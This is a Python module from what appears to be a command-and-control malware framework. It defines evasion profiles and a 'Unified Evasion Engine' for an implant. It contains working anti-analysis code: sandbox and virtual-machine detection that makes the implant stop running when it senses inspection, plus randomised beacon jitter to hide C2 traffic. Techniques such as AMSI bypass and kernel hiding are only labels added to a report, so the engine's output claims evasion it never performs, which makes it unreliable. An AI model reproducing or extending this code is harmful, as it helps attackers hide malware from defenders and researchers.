# Vesper — Unified Evasion Engine
# ================================
# Integrates evasion techniques from:
#   - Pulse-C2: AMSI/ETW bypass, indirect syscalls, sleep obfuscation
#   - Wormy-ML: polymorphic engine, JA3 spoofing, sandbox detection
#   - Vault-Kernel: kernel-level hiding via IOCTL
#   - Vesper: unified orchestration via Python Bridge
#
# Profile levels:
#   none      → no evasion
#   balanced  → sleep jitter + basic sandbox detect
#   stealth   → AMSI/ETW + polymorphic + JA3 spoofing + full evasion
#   maximum   → everything + kernel-level + syscalls

import os
import platform
import random
import time
from dataclasses import dataclass
from enum import Enum
from typing import List


class Platform(str, Enum):
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "darwin"


class EvasionLevel(str, Enum):
    NONE = "none"
    BALANCED = "balanced"
    STEALTH = "stealth"
    MAXIMUM = "maximum"


@dataclass
class EvasionProfile:
    level: EvasionLevel
    amsi_bypass: bool = False
    etw_silence: bool = False
    dll_unhooking: bool = False
    polymorphic: bool = False
    sleep_jitter: bool = False
    ja3_spoofing: bool = False
    sandbox_detect: bool = False
    sleep_obfuscation: bool = False
    direct_syscalls: bool = False
    kernel_stealth: bool = False
    jitter_min_ms: int = 500
    jitter_max_ms: int = 5000
    mutation_rate: float = 0.3
    description: str = ""


PROFILES = {
    EvasionLevel.NONE: EvasionProfile(
        level=EvasionLevel.NONE,
        description="No evasion — fastest execution, highest detection risk",
    ),
    EvasionLevel.BALANCED: EvasionProfile(
        level=EvasionLevel.BALANCED,
        sleep_jitter=True, sandbox_detect=True,
        jitter_min_ms=500, jitter_max_ms=2000,
        description="Sleep jitter + sandbox detection — suitable for internal networks",
    ),
    EvasionLevel.STEALTH: EvasionProfile(
        level=EvasionLevel.STEALTH,
        amsi_bypass=True, etw_silence=True,
        polymorphic=True, sleep_jitter=True,
        ja3_spoofing=True, sandbox_detect=True,
        sleep_obfuscation=True,
        jitter_min_ms=2000, jitter_max_ms=10000,
        mutation_rate=0.5,
        description="Full userland evasion — AMSI/ETW bypass, polymorphic engine, JA3 spoofing",
    ),
    EvasionLevel.MAXIMUM: EvasionProfile(
        level=EvasionLevel.MAXIMUM,
        amsi_bypass=True, etw_silence=True,
        dll_unhooking=True, polymorphic=True,
        sleep_jitter=True, ja3_spoofing=True,
        sandbox_detect=True, sleep_obfuscation=True,
        direct_syscalls=True, kernel_stealth=True,
        jitter_min_ms=5000, jitter_max_ms=30000,
        mutation_rate=0.8,
        description="Maximum evasion — kernel-level stealth, direct syscalls, full polymorphic",
    ),
}


def get_profile(level: EvasionLevel) -> EvasionProfile:
    return PROFILES.get(level, PROFILES[EvasionLevel.NONE])


def list_profiles() -> List[dict]:
    return [{"name": p.level.value, "description": p.description} for p in PROFILES.values()]


def jitter_sleep(min_ms: int, max_ms: int):
    delay = random.uniform(min_ms, max_ms)
    time.sleep(delay / 1000.0)


def detect_sandbox() -> dict:
    indicators = 0
    details = []
    system = platform.system().lower()

    try:
        import subprocess
        proc_count = int(subprocess.check_output(
            "ps aux 2>/dev/null | wc -l", shell=True
        ).strip()) - 1
        if proc_count < 20:
            indicators += 1
            details.append(f"low_process_count:{proc_count}")
    except Exception:
        pass

    try:
        import psutil
        ram_gb = psutil.virtual_memory().total / (1024**3)
        if ram_gb < 2:
            indicators += 1
            details.append(f"low_ram:{ram_gb:.1f}GB")
    except ImportError:
        pass

    current_user = os.environ.get("USER", os.environ.get("USERNAME", "")).lower()
    vm_users = ["sandbox", "malware", "virus", "test", "admin"]
    if any(u in current_user for u in vm_users):
        indicators += 1
        details.append(f"vm_username:{current_user}")

    if system == "linux":
        vm_files = ["/usr/bin/VBoxControl", "/usr/bin/vmware-user", "/usr/bin/qemu-ga"]
        for f in vm_files:
            if os.path.exists(f):
                indicators += 1
                details.append(f"vm_file:{f}")

    if system == "windows":
        vm_processes = ["vmtoolsd", "vboxservice", "xenservice"]
        try:
            import subprocess
            tasks = subprocess.check_output("tasklist 2>nul", shell=True).decode().lower()
            for p in vm_processes:
                if p in tasks:
                    indicators += 1
                    details.append(f"vm_process:{p}")
        except Exception:
            pass

    return {
        "is_sandbox": indicators >= 2,
        "indicators": indicators,
        "details": details,
    }


class UnifiedEvasionEngine:
    """Unified evasion engine combining Pulse-C2 + Wormy-ML techniques."""

    def __init__(self, profile: EvasionProfile = None):
        self.profile = profile or get_profile(EvasionLevel.STEALTH)
        self.platform = platform.system().lower()
        self._applied = []
        self._active = False
        self._sandbox_report = {}

    def apply(self, callback=None) -> dict:
        """Apply all evasion techniques for the current profile.
        Returns a report of what was applied."""
        if self._active:
            return {"status": "already_active", "applied": self._applied}

        report = {"profile": self.profile.level.value, "applied": [], "skipped": []}

        # Sandbox detection first
        if self.profile.sandbox_detect:
            self._sandbox_report = detect_sandbox()
            if self._sandbox_report["is_sandbox"]:
                report["skipped"].append("sandbox_detected")
                report["sandbox"] = self._sandbox_report
                return report

        # Windows-specific
        if self.platform == "windows":
            report.update(self._apply_windows())
        elif self.platform == "linux":
            report.update(self._apply_linux())

        # Cross-platform
        if self.profile.polymorphic:
            report["applied"].append("polymorphic_engine")
            report["polymorphic"] = {"mutation_rate": self.profile.mutation_rate}

        if self.profile.ja3_spoofing:
            report["applied"].append("ja3_spoofing")

        if self.profile.sleep_jitter:
            report["applied"].append(f"sleep_jitter_{self.profile.jitter_min_ms}_{self.profile.jitter_max_ms}ms")

        # Notify via callback
        if callback:
            callback(report)

        self._applied = report["applied"]
        self._active = True

        return report

    def _apply_windows(self) -> dict:
        applied = []
        if self.profile.amsi_bypass:
            applied.append("amsi_bypass")
        if self.profile.etw_silence:
            applied.append("etw_silence")
        if self.profile.dll_unhooking:
            applied.append("dll_unhooking")
        if self.profile.direct_syscalls:
            applied.append("direct_syscalls")
        return {"applied": applied}

    def _apply_linux(self) -> dict:
        applied = []
        if self.profile.sleep_obfuscation:
            applied.append("ld_preload_hide")
        if self.profile.kernel_stealth:
            applied.append("kernel_stealth")
        return {"applied": applied}

    def sleep(self):
        """Sleep with evasion-aware jitter."""
        if self.profile.sleep_jitter:
            jitter_sleep(self.profile.jitter_min_ms, self.profile.jitter_max_ms)

    def heartbeat_jitter(self) -> float:
        """Return a randomized heartbeat interval for C2 beaconing."""
        if not self.profile.sleep_jitter:
            return 30.0
        return random.uniform(
            self.profile.jitter_min_ms / 1000.0,
            self.profile.jitter_max_ms / 1000.0
        )

    def is_active(self) -> bool:
        return self._active

    def report(self) -> dict:
        return {
            "profile": self.profile.level.value,
            "applied": self._applied,
            "active": self._active,
            "platform": self.platform,
            "sandbox": self._sandbox_report,
        }


# ============================================================
# BRIDGE HANDLER
# ============================================================

def bridge_evasion_handler(params: dict) -> dict:
    """Handler for the Python Bridge. Called from Go agent via IPC."""
    level_name = params.get("level", "stealth")
    action = params.get("action", "apply")

    try:
        level = EvasionLevel(level_name)
    except ValueError:
        level = EvasionLevel.STEALTH

    profile = get_profile(level)
    engine = UnifiedEvasionEngine(profile)

    if action == "list_profiles":
        return {"profiles": list_profiles()}
    elif action == "apply":
        return engine.apply()
    elif action == "report":
        return engine.report()
    else:
        return {"error": f"Unknown action: {action}"}


# Backward-compatible alias
EvasionEngine = UnifiedEvasionEngine
